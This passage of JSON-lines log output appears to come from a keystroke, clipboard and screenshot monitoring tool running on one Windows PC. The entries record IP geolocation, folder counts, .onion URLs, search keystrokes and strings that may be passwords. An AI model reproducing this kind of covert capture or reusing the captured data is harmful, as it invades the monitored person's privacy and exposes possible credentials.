"fcd624f9741d9a220c8b9ba88517a892ac2de093c5d38a9c48dfab0b55d5adcb"}
{"timestamp": "2025-06-04T12:28:00.033362", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/", "keystrokes": "ld i install a vpn=?", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {"clipboard_url": {"malicious": 0, "suspicious": 0, "undetected": 29, "harmless": 67, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c0857bf944d60d589fbb24d0e6047c67ff75665da3364c2e8e74f005d94711d1", "screenshot_hash": "ffa59a2717fc536a4176ff9dd5815bacf101f99418476e73573a53720924c3df", "log_hash": "e62d4eaf0245a8b69caeee625689fd2a298b06652947939240dedd58ebdb7a21"}
{"timestamp": "2025-06-04T12:32:27.255868", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "dYqqVWEjFiTX7eOc", "keystrokes": "hidden wiki", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "8f529d722a2dffc33fef86d9cc3a46fd32464753d04b1de724d9531cdfe8bfb1", "screenshot_hash": "08462bd8084185bf228905bb051aae516b5b7c4d8bd2d3bc58f0d17da090ff08", "log_hash": "5157425b56241a05426065bc788433ae462b5ea334c4530c6d7657962962bb10"}
{"timestamp": "2025-06-04T12:32:54.019830", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "dYqqVWEjFiTX7eOc", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "8f529d722a2dffc33fef86d9cc3a46fd32464753d04b1de724d9531cdfe8bfb1", "screenshot_hash": "3bb999ed34343a7ab912e82a0c0f309c3f7ed01dcba9c240ec1f81cc044121d8", "log_hash": "dc9a1f88360060798ee78008e1f75ec2c18847dad2667bb780f7bcd2b90c5972"}
{"timestamp": "2025-06-04T12:33:21.378246", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "dYqqVWEjFiTX7eOc", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "8f529d722a2dffc33fef86d9cc3a46fd32464753d04b1de724d9531cdfe8bfb1", "screenshot_hash": "a3e72fff65e0572875362c1e520e9b2e62c9b7def09c5e6b877829b92bbd6518", "log_hash": "c2c4d4aaee4cff7263f27a02e67294c418f4c0128dbe9363baaf3007b793c250"}
{"timestamp": "2025-06-04T12:33:51.515864", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "dYqqVWEjFiTX7eOc", "keystrokes": "\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "8f529d722a2dffc33fef86d9cc3a46fd32464753d04b1de724d9531cdfe8bfb1", "screenshot_hash": "bac4e10b3360cd9f64b0190743f61c4d788b5c36f62c6e78607da89d80d7d8a0", "log_hash": "efb745bb3dc3464c3e8b3f500b95f379c91551f98c0729ce9117cac82356edd4"}
{"timestamp": "2025-06-04T12:34:18.402803", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://spywaredrcdg5krvjnukp3vbdwiqcv3zwbrcg6qh27kiwecm4qyfphid.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {"clipboard_url": {"malicious": 1, "suspicious": 0, "undetected": 28, "harmless": 67, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "efd3d8048718eeadc4af28ddb587786ca9d24a23465b9b2ce6ad470e5f9b6db8", "screenshot_hash": "85c2ab76cb656f3b8f92ffb07e243929af4fdf306472f690b53c247c6bda2f22", "log_hash": "e9a67c13f00e3a930191277332da33e657c3f218f3728bdf4648cb984df628f5"}
{"timestamp": "2025-06-04T12:34:45.942154", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.184.192.203", "country": "NL", "region": "South Holland", "city": "Naaldwijk", "isp": "AS49981 WorldStream", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://spywaredrcdg5krvjnukp3vbdwiqcv3zwbrcg6qh27kiwecm4qyfphid.onion/", "keystrokes": "op_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: NL"], "virustotal": {"clipboard_url": {"malicious": 1, "suspicious": 0, "undetected": 28, "harmless": 67, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "efd3d8048718eeadc4af28ddb587786ca9d24a23465b9b2ce6ad470e5f9b6db8", "screenshot_hash": "ec5752039900653e2c6c6afee38d2d204aa2b85928801173d7881a33942656ca", "log_hash": "d3a9cd9a751cb0eb9d280785ad70cf76c57cb26e0d7feeca47942aff88b41dfc"}
{"timestamp": "2025-06-05T10:41:43.847648", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": false, "alerts": ["Access from untrusted country: PT", "Screenshot error: screen grab failed"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "log_hash": "ffe540eed2a7d95c4a98f992257eb0ae97f9e0779cfb973e96dd03bb2f87433f"}
{"timestamp": "2025-06-05T10:42:09.731062", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": false, "alerts": ["Access from untrusted country: PT", "Screenshot error: screen grab failed"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "log_hash": "5e1c2a2d94517456ee77fbc69ec8815483f29750028bccfb74abae833129ee4c"}
{"timestamp": "2025-06-05T10:42:35.501603", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": false, "alerts": ["Access from untrusted country: PT", "Screenshot error: screen grab failed"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "log_hash": "7942021d50e80f921eb8e1404f5a883c7e4ee3dd7ed9adffb5b409f34663a88c"}
{"timestamp": "2025-06-05T10:43:01.168834", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "8be40787130781b39664d1296793239311e5e8fce34ae50beffb2d3b8c106125", "log_hash": "23c487f2aabace4286f401cc402819df0f8a4d425758a3fcbcd481dec321580a"}
{"timestamp": "2025-06-05T10:43:27.773548", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "488dadc116ccea47283aef8c978885cecc7b90c4e92a20df752c149b6a55a0d3", "log_hash": "6c04e9af132a8aa715082384d1ffb33772a8a8c4ddbed0a3a2a693f60540cdd7"}
{"timestamp": "2025-06-05T10:43:54.366503", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "50ae6cc9dc5d5fedab2cda3c837e1b229060c0abb19e955990994df1ef6a7ef8", "log_hash": "06698938a2b83b60825c4b3a275914c2e24cfe0664910a3be13a7a35bb16029d"}
{"timestamp": "2025-06-05T10:44:20.955561", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9d3557a968365c1ce693d0f8cc112296b0afbcf47dbec3e22c6438c6b2a3c4d2", "log_hash": "9c121478afa7e4afd3664622b8449e00ba169546f341b5318c0e4187b4227a8e"}
{"timestamp": "2025-06-05T10:44:47.266105", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9d3557a968365c1ce693d0f8cc112296b0afbcf47dbec3e22c6438c6b2a3c4d2", "log_hash": "008407ba46053a6e8fa0a8318d8265b4614a639f844558fc57f4f08041376a51"}
{"timestamp": "2025-06-05T10:45:13.580886", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2a6910941fe2350d71f6424d4a018ff269efb6296cef092f831db53c8e10e1b7", "log_hash": "2d3d9e17f9024257da4ab63d910a92dc9c0de0cfe57161acd66e856fb5e185d1"}
{"timestamp": "2025-06-05T10:45:40.084025", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "94fdd500e7ca2c8ff6b89bb9642fc93af063c0fded4331b471aee7fa350bf716", "log_hash": "ae8436a3bc4a50104477933d69ff328819dbf47cd1c1fc94d788ab0067955509"}
{"timestamp": "2025-06-05T10:46:06.709393", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b1720d946c649ed3cb379087ec693dcff7716609ff501567ab60881333268b4a", "log_hash": "b47f09a2756664fb3931d2cebdb6c0d3abe180d1cd05649d17a5ef9e00f7c8ca"}
{"timestamp": "2025-06-05T10:46:33.217373", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b1720d946c649ed3cb379087ec693dcff7716609ff501567ab60881333268b4a", "log_hash": "0270c3d6c7900a0f1e91f35939e7018171cd261d24c59bb37d7d9e8350a1370c"}
{"timestamp": "2025-06-05T10:46:59.972769", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e3d9e18b307a93d400f845d4bac7d0d8c864407b388a4f6d9d83f74f9a526311", "log_hash": "bd96f43ba7dc78aaf7623b4577b00da28b780dde3cedaa68d590cad9df2032bc"}
{"timestamp": "2025-06-05T10:47:26.873297", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "024145d9435425542986580e3deac719deca7033df3e675c064128a414adeaf4", "log_hash": "75bb92c58c02039d65d67e73b3f7ec69952d9f6df16d49828cad38d05573edfb"}
{"timestamp": "2025-06-05T10:47:53.434571", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "024145d9435425542986580e3deac719deca7033df3e675c064128a414adeaf4", "log_hash": "25796912452fd438e1237350ff8bb632aaa540956d75d44dba9b75a587e293a6"}
{"timestamp": "2025-06-05T10:48:19.989710", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "8954a5ae2f57a5e2a46b14cc03adb4caec4655b59945646ba17fbb3d1f04ff4f", "log_hash": "80c5e01d73a0da28096e5b530d81aed5e5a6dea9483d684609bc1d91a6c66b33"}
{"timestamp": "2025-06-05T10:48:46.277081", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "8954a5ae2f57a5e2a46b14cc03adb4caec4655b59945646ba17fbb3d1f04ff4f", "log_hash": "0d654079afd219b2e8a51c49e57c796f18a07e04268364ef503e5319bf1f7f13"}
{"timestamp": "2025-06-05T10:49:12.690927", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "91111f276b1df9c766c9d729461c4d72a968011fb3d73d7c66f4554a9190bc84", "log_hash": "45f2e32c858111d65b2289038deea594645ff239e89ae49afacefa47803ecd14"}
{"timestamp": "2025-06-05T10:49:39.508948", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3b4762d6b987d560418b43125634f26f8467eaad8b1af1a5ba8d45785ee85b1b", "log_hash": "929b3a9b483f69bd29e8693d6f56536f5b887e5cb14105a35d6794f4c81af561"}
{"timestamp": "2025-06-05T10:50:06.156611", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "100ba4d7c13e24c3dbf6463e1b9c12eee6e1135513cf064227fa9f9e5dc4a79a", "log_hash": "f8843ba4bccf18a598417c30f4b3667b78aa544fe74250d367347755fd7f6c9b"}
{"timestamp": "2025-06-05T10:50:32.405874", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "da6e489168c446f969ed5d24e436a6c9b1bf67bdcfb5c6ff642f2755fca51926", "log_hash": "2a4a52fe4d3175334a3be84bb606535f5aff5497a3aa998c6000515076cfea9c"}
